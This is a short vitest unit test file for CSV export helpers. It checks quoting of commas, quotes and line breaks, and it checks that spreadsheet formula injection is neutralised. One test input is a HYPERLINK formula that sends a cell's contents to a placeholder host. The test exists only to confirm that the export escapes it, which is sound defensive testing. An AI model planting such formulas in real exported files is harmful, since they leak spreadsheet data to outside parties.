import { describe, expect, it } from "vitest";
import { csvCell, csvRow } from "@/lib/utils/csv";

describe("csvCell", () => {
  it("passes plain values through", () => {
    expect(csvCell("Pump P-101")).toBe("Pump P-101");
    expect(csvCell(12)).toBe("12");
    expect(csvCell(null)).toBe("");
  });

  it("quotes delimiters, quotes and line breaks", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("l1\nl2")).toBe('"l1\nl2"');
    expect(csvCell("l1\rl2")).toBe('"l1\rl2"');
    expect(csvCell("a;b", ";")).toBe('"a;b"');
  });

  it("neutralises formula injection", () => {
    expect(csvCell('=HYPERLINK("https://x/?d="&E2,"Open")')).toBe(
      '"\'=HYPERLINK(""https://x/?d=""&E2,""Open"")"'
    );
    expect(csvCell("+1+1")).toBe("'+1+1");
    expect(csvCell("-2")).toBe("'-2");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
  });

  it("builds rows", () => {
    expect(csvRow(["a", "b,c", "=1"])).toBe('a,"b,c",\'=1');
  });
});
